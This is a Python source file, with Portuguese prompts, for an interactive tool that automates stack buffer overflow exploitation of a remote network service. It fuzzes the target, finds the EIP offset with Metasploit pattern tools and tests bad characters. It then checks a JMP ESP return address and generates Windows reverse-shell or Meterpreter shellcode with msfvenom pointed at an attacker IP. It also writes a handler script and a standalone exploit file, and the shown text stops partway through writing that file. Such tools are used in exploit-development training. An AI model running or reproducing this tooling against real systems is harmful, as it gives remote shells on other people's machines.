#!/usr/bin/env python3
#Criado por Daniel Domingues
#https://github.com/lohcus

import socket
import os
import sys
from time import sleep
from ipaddress import ip_address
import math
import shutil

def clear():                #FUNCAO PARA LIMPAR A TELA
    _ = os.system("clear")
#=======================================================================================================================

def divisao():              #FUNCAO PARA DIVISOES NA TELA
    # DETERMINA O TAMANHO DO CONSOLE
    colunas, linhas = shutil.get_terminal_size((80, 20))
    print("\033[1;37m{}\033[m".format('=' * colunas))
#=======================================================================================================================

def titulo(title):          #FUNCAO PARA EXIBIR OS TITULOS DAS TELAS
    global colunas, linhas
    # DETERMINA O TAMANHO DO CONSOLE
    colunas, linhas = shutil.get_terminal_size((80, 20))
    title = title + " - BY LOHCUS"
    igual = "=" * math.trunc((colunas - len(title)) / 2)
    print("\033[1;32m{}\033[1;31m{}\033[1;32m{}\033[m".format(igual, title, igual))
    print("\033[1;37m{}\033[m".format('=' * colunas))
#=======================================================================================================================

def parametros():           #FUNCAO PARA ENTRADA DOS PARÂMETROS DO ALVO
    global host, port, parametro, banner

    print("\033[1;33mAINDA NÃO FORAM DEFINIDOS O \033[1;31mIP\033[1;33m, \033[1;31mPORTA\033[1;33m E \033[1;31mPARÂMETROS\033[1;33m DO ALVO!\033[m")

    while True:
        host = input("\033[1;33mDIGITE O \033[1;31mIP\033[1;33m DA MÁQUINA \033[1;31mALVO\033[1;33m: \033[m")
        try:
            ip_address(host)    #TESTA SE VALOR DIGITADO É REALMENTE UM IP
            break
        except:
            print("\033[1;31mIP inválido! Digite o IP corretaente!!\033[m")

    while True:
        port = input("\033[1;33mDIGITE A \033[1;31mPORTA\033[1;33m DA MÁQUINA \033[1;31mALVO\033[1;33m: \033[m")
        if port.isnumeric() and 1 <= int(port) <= 65535: break
        else: print("\033[1;31mPorta inválida! Digite portas entre 1 e 65535!\033[m")

    while True:
        parametro = input("\033[1;33mQUAL PARÂMETRO DESEJA EXPLOITAR? (\033[1;31mUSER\033[1;33m/\033[1;31mPASS\033[1;33m/\033[1;31mOUTRO\033[1;33m): \033[m").upper()
        if parametro == "USER": break
        if parametro == "PASS": break
        if parametro == "OUTRO":
            parametro = input("\033[1;33mQUE PARÂMETRO DESEJA EXPLOITAR? (\033[1;32mENTER\033[1;33m PARA NENHUM): \033[m").upper()
            break

    while True:
        banner = input("\033[1;33mAGUARDAR RESPOSTA DA CONEXÃO (BANNER APÓS A CONEXÃO AO SERVIÇO)? (\033[1;32mS\033[1;33m/\033[1;31mN\033[1;33m): \033[m").upper()
        if banner == "S": break
        if banner == "N": break
#=======================================================================================================================

def envia():                #FUNCAO PARA ENVIO DOS PACOTES PARA O ALVO
    global host, port, string, parametro, conn, banner, escolha, crash
    # EXIT(1) = PROBLEMA DE CONEXAO APOS ENVIO DE BYTES (CRASH)
    # EXIT(2) = PROBLEMA DE CONEXAO
    # EXIT(3) = NAO RESPONDE DEPOIS DO ENVIO DOS BYTES (CRASH)
    # ESCREVENDO O ARQUIVO DE BADCHARS
    with open("BoF_Envia.py", "w") as f:
        f.write("#!/usr/bin/python\n\n")

        f.write("import socket\n")
        f.write("from time import sleep\n\n")

        f.write("host = '{}'\n".format(host))
        f.write("port = '{}'\n".format(port))
        f.write("string = '{}'\n".format(string))
        f.write("parametro = '{}'\n".format(parametro))
        f.write("escolha = '{}'\n".format(escolha))
        f.write("crash = '{}'\n\n".format(crash))

        f.write("conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
        f.write("conn.settimeout(10)\n")
        f.write("try:\n")
        f.write("   conn.connect((host, int(port)))\n")
        if banner == "S":
            f.write("   resp = conn.recv(1024)\n\n")

        f.write("except Exception as erro:\n")
        f.write("   if escolha == '1' and crash > 0: exit(1)\n")
        f.write("   else: exit(2)\n\n")

        f.write("try:\n")
        if parametro == "USER":
            f.write("   conn.send('USER ' + string + '\\r\\n\\r\\n')\n")
            f.write("   resp = conn.recv(1024)\n")
        elif parametro == "PASS":
            f.write("   conn.send('USER teste' + '\\r\\n\\r\\n')\n")
            f.write("   resp = conn.recv(1024)\n")
            f.write("   conn.send('PASS ' + string + '\\r\\n\\r\\n')\n")
            f.write("   resp = conn.recv(1024)\n")
        else:
            if parametro == "":
                f.write("   conn.send(string + '\\r\\n\\r\\n')\n")
                f.write("   resp = conn.recv(1024)\n")
            else:
                f.write("   conn.send(parametro + string + '\\r\\n\\r\\n')\n")
                f.write("   resp = conn.recv(1024)\n")
        f.write("except Exception as erro:\n")
        f.write("   exit(3)\n")
        f.write("exit(0)")
    f.close()

    retorno_envia=os.system("python BoF_Envia.py")
    return retorno_envia/256
#=======================================================================================================================

def test_eip_jmp(type):     #FUNCAO PARA VERIFICAR ENDEREÇO DE EIP OU JMP ESP DIGITADO
    while True:
        address = input("\033[1;33mDIGITE O VALOR DO \033[1;31m{}\033[1;33m: \033[m".format(type))
        if len(address) == 8:
            for i in range(len(address)):
                if address[i] in "1234567890abcdefABCDEF":
                    pass
                else:
                    break
            if address[i] in "1234567890abcdefABCDEF":
                break
            else:
                print("\033[1;31mO {} deve conter algarismos \033[1;32mHexadecimais\033[1;31m (\033[1;32m0-9\033[1;31m e \033[1;32ma-f\033[1;31m)!\033[m".format(type))
                divisao()
        else:
            print("\033[1;31mO {} deve conter \033[1;32m8 dígitos\033[1;31m!\033[m".format(type))
            divisao()
    return(address)
#=======================================================================================================================

def define_ruptura():
    global bytes_sobrescrita
    print("\033[1;31m\nAINDA NÃO FOI DEFINIDO O PONTO DE RUPTURA!\033[m")
    while True:
        bytes_sobrescrita = input("\033[1;33mDIGITE O VALOR DO PONTO DE RUPTURA: \033[m")
        if bytes_sobrescrita.isnumeric():
            divisao()
            break
#=======================================================================================================================

def pergunta(msg):
    divisao()
    print(msg)
    divisao()
    if input("\033[1;33mPRESSIONE \033[1;32mENTER\033[1;33m PARA TENTAR NOVAMENTE OU DIGITE \033[1;32mMENU"
             "\033[1;33m PARA RETORNAR AO MENU PRINCIPAL: \033[m").upper() == "MENU":
        return 1
    return 0
#=======================================================================================================================

def color_menu():           #FUNCAO PARA COLORIR OS NUMEROS DOS MENUS JA EXECUTADOS
    global escolha
    global valor
    if valor < int(escolha):
        valor = int(escolha)
#=======================================================================================================================

def fuzzy():                #FUNCAO PARA REALIZAR O FUZZY
    clear()
    titulo("TESTE INCREMENTAL DE STRING (FUZZY)")
    global host, port, parametro, banner, crash, string, conn, retorno

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if host == "" or port == "": parametros()
    else:
        while True:
            opcao = input("\033[1;33mDESEJA MANTER O IP E PORTA DA MÁQUINA \033[1;31mALVO\033[1;33m (\033[1;31m{}\033[1;33m:\033[1;31m{})\033[1;33m? (\033[1;32mS\033[1;33m/\033[1;31mN\033[1;33m) \033[m".format(host,port)).upper()
            if opcao == "S": break
            if opcao == "N":
                parametros()
                break

    while True:
        incr = input("\033[1;33mAGORA DIGITE O VALOR DO \033[1;31mINCREMENTO\033[1;33m: \033[m")
        if incr.isnumeric() and 1 <= int(incr) >= 1: break
        else: print("\033[1;31mValor inválido! Digite valores numéricos!\033[m")

    while True:
        laco = input("\033[1;33mDIGITE TAMBÉM A QUANTIDADE DE \033[1;31mREPETIĆÕES\033[1;33m: \033[m")
        if laco.isnumeric() and 1 <= int(laco) >= 1: break
        else: print("\033[1;31mValor inválido! Digite valores numéricos!\033[m")

    divisao()
    input("\033[1;33mINICIE A APLICAÇÃO E PRESSIONE \033[1;32mENTER\033[1;33m PARA CONTINUAR...\033[m")
    divisao()
    buffer = [""]
    cont = int(incr)

    # CRIA UM ARRAY COM A QUANTIDADE DE REPETIÇÕES E O INCREMENTO DIGITADOS
    while len(buffer) <= int(laco):
        buffer.append("A" * cont)
        cont = cont + int(incr)

    # ENVIA AS STRINGS, UMA POR VEZ, ATÉ O CRASH DA APLICAÇÃO OU FIM DO ARRAY
    for string in buffer:
        crash = len(string)             # VARIÁVEL PARA SER UTILIZADA COMO TAMANHO DO PATTERN DA FUNÇÃO RUPTURA()
        print("Enviando string com {} bytes".format(len(string)))
        retorno_envia = envia()

        if (retorno_envia == 1) or (retorno_envia == 3):        # CASO A APLICAÇÃO CRASH, OCORRE TIMEOUT NO MÉTODO SEND E O FLUXO VEM PARA O TRATAMENTO DA EXCEĆÃO
            divisao()
            print("\033[1;33mAPLICAÇÃO CRASHOU COM \033[1;31m{} BYTES\033[m\n".format(crash))

            while True:
                registrador = input("\033[1;31mATENÇÃO!!! \033[1;33mO REGISTRADOR \033[1;31mEIP\033[1;33m ESTÁ PREENCHIDO COM OS VALORES \033[1;31m41414141\033[1;33m? (\033[1;32mS\033[1;33m/\033[1;31mN\033[1;33m) \033[m").upper()
                divisao()
                if registrador == "S": break
                if registrador == "N":          # CASO EIP NÃO SEJA SOBRESCRITO, A FUNCAO REINICIA
                    if pergunta("\033[1;33mTENTE UMA COMBINAÇÃO DE '\033[1;32mINCREMENTO\033[1;33m' E '\033[1;32mREPETIÇÕES\033[1;33m' QUE PASSE DO VALOR {}\n\033[m".format(crash)) == 1:
                        crash = ""
                        retorno = 1; return
                    retorno = 0; return
            input("\033[1;33mPRESSIONE \033[1;32mENTER\033[1;33m PARA RETORNAR AO MENU...\033[m")
            retorno = 1; return
        elif retorno_envia == 2:
            if pergunta("\033[1;31mOCORREU UM PROBLEMA DE CONEXÃO COM O ALVO!\033[m") == 1:
                retorno = 1;
                return
            retorno = 0;
            return

    # SE O FLUXO CHEGAR AQUI É PORQUE NÃO CRASHOU A APLICAÇÃO
    conn.close()
    if pergunta("\033[1;31mA APLICAÇÃO NÃO CRASHOU COM UMA STRING DE \033[1;32m{} BYTES\033[1;33m!\n\033[1;33mTENTE UM \033[1;32mINCREMENTO\033[1;33m OU UM NÚMERO DE \033[1;32mREPETICOES\033[1;33m MAIOR".format(crash)) == 1:
        crash = ""
        retorno = 1; return
    retorno = 0; return
#=======================================================================================================================

# FUNCAO QUE ENVIA UMA STRING DO TAMANHO DA string QUE CRASHOU A APLICAĆÃO
def ruptura():
    clear()
    titulo("VERIFICAÇÃO DO PONTO DE RUPTURA")
    global host, port, banner, crash, parametro, bytes_sobrescrita, string, conn, retorno

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if host == "" or port == "": parametros()

    if crash == "":
        while True:
            crash = input("\033[1;33mAINDA NÃO FOI DEFINIDA O TAMANHO DA STRING! QUAL O TAMANHO DESEJA UTILIZAR? \033[m")
            if crash.isnumeric():
                divisao()
                break

    input("\033[1;33mINICIE A APLICAÇÃO E PRESSIONE \033[1;32mENTER\033[1;33m PARA CONTINUAR...\033[m")
    divisao()
    print("Gerando string de caracteres únicos com {} bytes\n".format(str(crash)))
    print("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {}\n".format(crash))
    string = os.popen("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l " + str(crash)).read()
    string = string[:-1]
    print(string)
    retorno_envia = envia()
    divisao()

    if retorno_envia == 2:
        if pergunta("\033[1;31mOCORREU UM PROBLEMA DE CONEXÃO COM O ALVO!\033[m") == 1:
            retorno = 1; return
        retorno = 0; return

    try:
        valor_eip = test_eip_jmp("EIP") # REFERE-SE AO VALOR DO EIP QUANDO É MANDADA A STRING ÚNICA E NÃO TEM RELAÇÃO COM A VARIAVEL GLOBAL valor_eip
        print("Calculando o valor do ponto de ruptura...\n")
        print("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {} -q {}\n".format(crash,valor_eip))
        valor_ruptura = os.popen("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l " + str(crash) + " -q " + valor_eip).read()
        #TESTE PARA VERIFICAR SE FOI ENCONTRADO O PONTO DE RUPTURA
        if valor_ruptura != "":
            valor_ruptura = valor_ruptura.split()
            if valor_ruptura[len(valor_ruptura)-1].isnumeric():
                divisao()
                bytes_sobrescrita = valor_ruptura[len(valor_ruptura) - 1]
                print("\033[1;33mO VALOR DE RUPTURA FOI DE \033[1;32m{} BYTES\033[m".format(bytes_sobrescrita))
                input("\033[1;33m\nPRESSIONE \033[1;32mENTER\033[1;33m PARA RETORNAR AO MENU...\033[m")
                retorno = 1; return
        else:  #FORCAR ERRO
            erro = 1/0  #FORÇA ERRO
    except:
        if pergunta("\033[1;31mVALOR NÃO CORRESPONDE A NENHUMA POSIÇÃO! VERIFIQUE SE O EIP FOI DIGITADO CORRETAMENTE!\033[m") == 1:
            retorno = 1; return
        retorno = 0; return
#=======================================================================================================================

def eip():
    clear()
    titulo("VERIFICAÇÃO DE SOBRESCRITA DO EIP")
    global host, port, banner, parametro, bytes_sobrescrita, valor_eip, string, conn, retorno

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if host == "" or port == "": parametros()
    if bytes_sobrescrita == "": define_ruptura()

    input("\033[1;33mINICIE A APLICAÇÃO E PRESSIONE \033[1;32mENTER\033[1;33m PARA CONTINUAR...\033[m")
    divisao()
    string = "A" * int(bytes_sobrescrita) + "B" * 4
    print("Enviando string para sobrescrita do EIP...\n")
    print(string)
    retorno_envia = envia()
    divisao()

    if retorno_envia == 2:
        if pergunta("\033[1;31mOCORREU UM PROBLEMA DE CONEXÃO COM O ALVO!\033[m") == 1:
            retorno = 1; return
        retorno = 0; return

    while True:
        saida = input("\033[1;33mVERIFICQUE SE O \033[1;31mEIP\033[1;33m DA APLICAÇÃO FOI SOBRESCRITO COM \033[1;31m42424242\033[1;33m: (\033[1;32mS\033[1;33m/\033[1;31mN\033[1;33m) \033[m").upper()
        divisao()
        if saida == "S":
            print("\033[1;32mOK! O VALOR EXATO NECESSÁRIO PARA SOBRESCREVER O EIP É DE \033[1;32m{} BYTES\033[m".format(int(bytes_sobrescrita) + 4))
            valor_eip = int(bytes_sobrescrita) + 4
            divisao()
            input("\033[1;33mPRESSIONE \033[1;32mENTER\033[1;33m PARA RETORNAR AO MENU...\033[m")
            retorno = 1; return
        if saida == "N":
            if pergunta("\033[1;31mVERIFIQUE SE O TAMANHO DA STRING PARA SOBRESCREVER O EIP ESTÁ CORRETA!!\033[m") == 1:
                retorno = 1; return
            retorno = 0; return

# =======================================================================================================================

def espaco():
    clear()
    titulo("VERIFICANDO ESPAÇO PARA O SHELLCODE")
    global host, port, banner, parametro, bytes_sobrescrita, valor_eip, string, conn, retorno

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if host == "" or port == "": parametros()
    if bytes_sobrescrita == "": define_ruptura()

    while True:
        temp = input("\033[1;33mDIGITE O TAMANHO DO SHELLCODE A SER VERIFICADO (EM BYTES): \033[m")
        if temp.isnumeric(): break

    input("\033[1;33mINICIE A APLICAÇÃO E PRESSIONE \033[1;32mENTER\033[1;33m PARA CONTINUAR...\033[m")
    divisao()

    string = "A" * int(bytes_sobrescrita) + "B" * 4 + "C" * (int(temp)-4) + "D" * 4
    print("Enviando string com {} bytes 'C' e 4 bytes 'D' após a posição do EIP...\n".format(temp))
    print(string)
    retorno_envia = envia()
    divisao()

    if retorno_envia == 2:
        if pergunta("\033[1;31mOCORREU UM PROBLEMA DE CONEXÃO COM O ALVO!\033[m") == 1:
            retorno = 1; return
        retorno = 0; return

    while True:
        saida = input("\033[1;31mATENÇÃO!!! \033[1;33mVERIFICQUE SE FORAM O \033[1;31mEIP\033[1;33m ESTÁ SOBRESCRITO COM \033[1;31m42424242\033[1;33m E SE FORAM IMPRESSOS OS BYTES \033[1;31m{} 'C'\033[1;33m E OS \033[1;31m4 'D'\033[1;33m NO ESP: (\033[1;32mS\033[1;33m/\033[1;31mN\033[1;33m) \033[m".format(temp)).upper()
        divisao()
        if saida == "S":
            print("\033[1;32mOK! HÁ ESPAÇO PARA O SHELLCODE!!\033[m")
            valor_eip = int(bytes_sobrescrita) + 4
            divisao()
            input("\033[1;33mPRESSIONE \033[1;32mENTER\033[1;33m PARA RETORNAR AO MENU...\033[m")
            retorno = 1; return
        if saida == "N":
            if pergunta("\033[1;31mVERIFIQUE OS PARÂMETROS DE ENTRADA!!\033[m") == 1:
                retorno = 1; return
        retorno = 0; return
# =======================================================================================================================

#FUNCAO PARA TESTAR OS BAD CHARS E TIRA-LOS DO PAYLOAD FUTURAMENTE
def badchar():
    clear()
    titulo("TESTE DE BAD CHARS")
    global host, port, banner, crash, parametro, bytes_sobrescrita, bad_chars, retorno

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if host == "" or port == "": parametros()

    if bytes_sobrescrita == "": define_ruptura()

    input("\033[1;33mINICIE A APLICAÇÃO E PRESSIONE \033[1;32mENTER\033[1;33m PARA CONTINUAR...\033[m")
    divisao()

    bad_string = '"A" * int(bytes_sobrescrita) + "B" * 4 + '
    bad_string_local = "A" * int(bytes_sobrescrita) + "B" * 4
    string_bad_chars = r'"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"'
    bad_chars = ""

    while True:
        clear()
        titulo("TESTE DE BAD CHARS")
        print("Enviando a string para o alvo com os BAD CHARS abaixo:\n")
        print(str(bad_string_local+string_bad_chars))

        # ESCREVENDO O ARQUIVO DE BADCHARS
        with open("BoF_BadChars.py", "w") as f:
            f.write("#!/usr/bin/env python3\n\n")
            f.write("import socket\n\n")
            f.write("host = '{}'\n".format(host))
            f.write("port = '{}'\n".format(port))
            f.write("parametro = '{}'\n".format(parametro))
            f.write("bytes_sobrescrita = '{}'\n".format(bytes_sobrescrita))
            f.write("bad_string = {}{}\n".format(bad_string,string_bad_chars))
            f.write("try:\n")
            f.write("   conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
            f.write("   conn.settimeout(5)\n")
            f.write("   conn.connect((host, int(port)))\n")

            if banner == "S": f.write("   resp = conn.recv(1024)\n\n")

            if parametro == "USER": f.write("   conn.send(('USER ' + str(bad_string) + '\\r\\n').encode('utf-8'))\n")
            elif parametro == "PASS":
                f.write("   conn.send(('USER teste' + '\\r\\n').encode('utf-8'))\n")
                f.write("   resp = conn.recv(1024)\n")
                f.write("   conn.send(('PASS ' + str(bad_string) + '\\r\\n').encode('utf-8'))\n")
            else:
                if parametro == "": f.write("   conn.send((str(bad_string) + '\\r\\n\\r\\n').encode('utf-8'))\n")
                else: f.write("   conn.send((parametro + str(bad_string) + '\\r\\n\\r\\n').encode('utf-8'))\n")

            f.write("except Exception as erro:\n")
            f.write("   exit(1)")

        f.close()

        if os.system("python3 BoF_BadChars.py") == 0:
            divisao()
            print("\033[1;33mPROCURE A STRING SEQUENCIAL LOGO APÓS A SEQUÊNCIA DE \033[1;31m41\033[1;33m!\033[m")
            print("\033[1;33mCASO A SEQUÊNCIA SEJA QUEBRADA, DIGITE O CHAR NA LINHA ABAIXO, UM POR VEZ!\n\033[m")
            print("\033[1;33mLISTA DE BAD CHARS: \033[1;32m{}\033[m".format(bad_chars))
            char = input("\033[1;33mDIGITE O \033[1;32mBAD CHAR QUE CRASHOU\033[1;33m OU \033[1;32mOK\033[1;33m PARA CONCLUIR A LISTA DE BAD CHARS (FORMATO \\x00): \033[m").lower()
            if char.upper() == "OK":
                divisao()
                print("\033[1;32mLISTA DE BAD CHARS: \033[1;32m{}\033[m".format(bad_chars))
                divisao()
                input("\033[1;33mPRESSIONE \033[1;32mENTER\033[1;33m PARA RETORNAR AO MENU...\033[m")
                retorno = 1; return
            if string_bad_chars.find(char) != -1:
                string_bad_chars = string_bad_chars.replace(char.lower(), "")
                bad_chars += char
            else:
                divisao()
                print("\033[1;31mCHAR NÃO RECONHECIDO OU JÁ ADICIONADO A LISTA DOS BAD CHARS\033[m")
            divisao()
            input("\033[1;32mREINICIE A APLICAÇÃO\033[1;33m ALVO E PREESIONE \033[1;32mENTER\033[1;33m PARA REENVIAR OS BAD CHARS...\033[m")
        else:
            if pergunta("\033[1;31mOCORREU ALGUM PROBLEMA DURANTE O ENVIO DOS BAD CHARS\033[m") == 1:
                retorno = 1; return
            retorno = 0; return
#=======================================================================================================================

def controle():
    clear()
    titulo("VERIFICANDO O CONTROLE DO EIP")
    global host, port, banner, parametro, bytes_sobrescrita, valor_eip, jmp, jmp_esp, controle_eip, conn, string, retorno

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if host == "" or port == "": parametros()
    if bytes_sobrescrita == "": define_ruptura()

    while True:
        temp = input("\033[1;33mDIGITE O TAMANHO DO ESPAÇO DO SHELLCODE (EM BYTES): \033[m")
        if temp.isnumeric(): break

    if jmp == "":
        print("\033[1;33m\nPROCURE UMA INSTRUÇÃO \033[1;31mJMP ESP\033[1;33m NOS MÓDULOS CARREGADOS PELO EXECUTÁVEL\n")
        jmp = test_eip_jmp("ESP")
    else:
        while True:
            opcao = input("\033[1;33mDESEJA MANTER O ENDERECO DE RETORNO AO \033[1;31mESP \033[1;33m(\033[1;31m{}\033[1;33m)? (\033[1;32mS\033[1;33m/\033[1;31mN\033[1;33m) \033[m".format(jmp)).upper()
            if opcao == "N":
                jmp = test_eip_jmp("ESP")
                break
            elif opcao == "S": break

    jmp_esp = ""
    for i in range(7,0,-2): jmp_esp += "\\x" + jmp[i - 1] + jmp[i]

    string = 'A' * int(bytes_sobrescrita) + jmp_esp + 'C' * int(temp)
    input("\033[1;33mCOLOQUE UM \033[1;31mBREAK POINT\033[1;33m NO ENDEREÇO DE RETORNO (\033[1;31m{}\033[1;33m) E INICIE A APLICAÇÃO! PRESSIONE \033[1;32mENTER\033[1;33m PARA CONTINUAR...\033[m".format(jmp.upper()))
    retorno_envia = envia()
    divisao()

    if retorno_envia == 2:
        if pergunta("\033[1;31mOCORREU UM PROBLEMA DE CONEXÃO COM O ALVO!\033[m") == 1:
            retorno = 1;
            return
        retorno = 0; return

    while True:
        saida = input("\033[1;33mVERIFICQUE SE A APLICAÇÃO PAROU EXATAMENTE NO \033[1;32mJMP ESP\033[1;33m: (\033[1;32mS\033[1;33m/\033[1;31mN\033[1;33m) \033[m").upper()
        divisao()
        if saida == "S":
            print("\033[1;32mOK! AGORA PRESSIONE \033[1;31m'F7'\033[1;32m NA APLICAÇÃO PARA VERIFICAR SE SALTA PARA O \033[1;32mESP\033[1;33m ONDE ESTÃO OS BYTES 'C'\033[m")
            valor_eip = int(bytes_sobrescrita) + 4
            controle_eip = "SIM"
            divisao()
            input("\033[1;33mPRESSIONE \033[1;32mENTER\033[1;33m PARA RETORNAR AO MENU...\033[m")
            retorno = 1; return
        if saida == "N":
            if pergunta("\033[1;31mVERIFIQUE OS PARÂMETROS DE ENTRADA!!\033[m") == 1:
                retorno = 1; return
            retorno = 0; return
# =======================================================================================================================

#FUNCAO PARA GERAR O shellcode
def payload():
    clear()
    titulo("PARÂMETROS PARA GERAR O SHELLCODE")
    global bad_chars, string_payload, shellcode, retorno

    while True:
        IP = input("\033[1;33mDIGITE O \033[1;32mIP\033[1;33m DO \033[1;32mATACANTE\033[1;33m: \033[m")
        try:
            ip_address(IP)
            break
        except:
            print("\033[1;31mIP inválido! Digite o IP corretamente!!\033[m")

    while True:
        porta = input("\033[1;33mDIGITE A \033[1;32mPORTA\033[1;33m DO \033[1;32mATACANTE\033[1;33m: \033[m")
        if porta.isnumeric() and 1 <= int(porta) <= 65535: break
        else: print("\033[1;31mPorta inválida! Digite portas entre 1 e 65535!\033[m")

    if bad_chars == "": bad_chars += input("\033[1;31mAINDA NÃO FORAM DEFINIDOS BAD CHARS.\n\033[1;33mDIGITE OS BAD CHARS QUE QUER \033[1;32mEXCLUIR\033[1;33m DO SHELLCODE: \033[m").lower()

    while True:
        tipo = input('\033[1;33mCRIAR EXPLOIT COM PAYLOAD NORMAL OU COM METERPRETER (\033[1;31mN\033[1;33m/\033[1;32mM\033[1;33m) \033[m').upper()
        divisao()
        print("Construindo Shellcode...")
        if tipo == "N":
            if bad_chars == "":
                print("\nmsfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=" + IP + " LPORT=" + porta + " -f c -e x86/shikata_ga_nai 2> /dev/null\n")
                string_payload = os.popen("msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=" + IP + " LPORT=" + porta + " -f c -e x86/shikata_ga_nai 2> /dev/null").read()
            else:
                print("\nmsfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=" + IP + " LPORT=" + porta + " -f c -e x86/shikata_ga_nai -b '" + bad_chars + "' 2> /dev/null\n")
                string_payload = os.popen("msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=" + IP + " LPORT=" + porta + " -f c -e x86/shikata_ga_nai -b '" + bad_chars + "' 2> /dev/null").read()
            print(string_payload)
            divisao()
            print("\033[1;32mEXECUTE O COMANDO \033[1;31m'nc -nlvp {}'\033[1;32m E VÁ PARA O ITEM \033[1;31m8\033[1;32m NO MENU\033[m".format(porta))
            break
        elif tipo == "M":
            if bad_chars == "":
                print("\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=" + IP + " LPORT=" + porta + " -f c -e x86/shikata_ga_nai 2> /dev/null\n")
                string_payload = os.popen("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=" + IP + " LPORT=" + porta + " -f c -e x86/shikata_ga_nai 2> /dev/null").read()
            else:
                print("\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=" + IP + " LPORT=" + porta + " -f c -e x86/shikata_ga_nai -b '" + bad_chars + "' 2> /dev/null\n")
                string_payload = os.popen("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=" + IP + " LPORT=" + porta + " -f c -e x86/shikata_ga_nai -b '" + bad_chars + "' 2> /dev/null").read()
            print(string_payload)
            with open("escuta.rc", "w") as file:
                file.write("use exploit/multi/handler\n")
                file.write("set payload windows/meterpreter/reverse_tcp\n")
                file.write("set lhost {}\n".format(IP))
                file.write("set lport {}\n".format(porta))
                file.write("set exitfunc none\n")
                file.write("run")
            file.close()
            divisao()
            print("\033[1;32mEXECUTE O COMANDO \033[1;31m'msfconsole -r escuta.rc'\033[1;32m E VÁ PARA O ITEM \033[1;31m8\033[1;32m NO MENU\033[m".format(porta))
            break

    string_payload = str(string_payload[23:-2])
    string_payload = "PAYLOAD = (" + string_payload + ")"
    divisao()
    shellcode = 1
    input("\033[1;33mPRESSIONE \033[1;32mENTER\033[1;33m PARA RETORNAR AO MENU...\033[m")
    retorno = 1; return
# =======================================================================================================================

def exploit():
    clear()
    titulo("EXPLOIT!!!")
    global host, port, parametro, banner, bytes_sobrescrita, bad_chars, string_payload, jmp, shellcode, retorno

    if shellcode == 0:
        print("\n\033[1;31mAINDA NÃO FOI GERADO O SHELLCODE! EXECUTE O ITEM \033[1;32m7\033[1;31m ANTES DE EXECUTAR O EXPLOIT!\033[m")
        input("\033[1;33m\nPRESSIONE \033[1;32mENTER\033[1;33m PARA RETORNAR AO MENU...\033[m")
        retorno = 1; return

    if host == "" or port == "":
        parametros()
        print()
        while True:
            bytes_sobrescrita = input("\033[1;33mDIGITE O VALOR DO PONTO DE RUPTURA: \033[m")
            if bytes_sobrescrita.isnumeric(): break
        print()

    if jmp == "": jmp = test_eip_jmp("ESP")
    else:

        while True:
            temp = input("\033[1;33mDESEJA MANTER O VALOR RELACIONADO AO \033[1;31mESP\033[1;33m (\033[1;31m{}\033[1;33m)? (S/N) \033[m".format(jmp)).upper()
            if temp == "N":
                jmp = test_eip_jmp("ESP")
                break
            if temp == "S": break

    jmp_esp = ""
    for i in range(7, 0, -2): jmp_esp += "\\x" + jmp[i - 1] + jmp[i]

    divisao()
    input("\033[1;33mINICIE A APLICAÇÃO E PRESSIONE \033[1;32mENTER\033[1;33m PARA CONTINUAR...\033[m")
    divisao()

    # ESCREVENDO O ARQUIVO DE EXPLOIT
    with open("BoF_Exploit.py", "w") as f:
        f.write("#!/usr/bin/python\n\n")
        f.write("import socket\n\n")
        f.write("host = '{}'\n".format(host))
        f.write("port = '{}'\n".format(port))
        f.write("parametro = '{}'\n".format(parametro))
        f.write("bytes_sobrescrita = '{}'\n".format(bytes_sobrescrita))
